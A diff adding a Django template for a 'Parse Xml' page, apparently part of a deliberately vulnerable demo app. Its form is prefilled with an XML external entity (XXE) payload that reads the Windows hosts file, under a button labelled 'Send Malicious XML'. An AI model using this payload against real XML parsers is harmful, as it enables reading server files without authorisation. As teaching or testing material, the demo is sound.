@@ -1,0 +1,26 @@
+{% extends 'base.html' %}
+
+{% block title %}Parse Xml{% endblock %}
+
+{% block content %}
+    <h2>Parse Xml</h2>
+    <form method="POST" action="/parse_xml/">
+        {% csrf_token %}
+        <label for="xml">XML Data</label>
+        <textarea id="xml" name="xml" rows="10" cols="50" required>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;
+]&gt;
+&lt;root&gt;
+    &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;
+        </textarea>
+        <button type="submit">Send Malicious XML</button>
+    </form>
+    {% if message %}
+        <p>{{ message }}</p>
+        <pre>{{ xml_data }}</pre>
+    {% elif error %}
+        <p>{{ error }}</p>
+    {% endif %}
+{% endblock %}
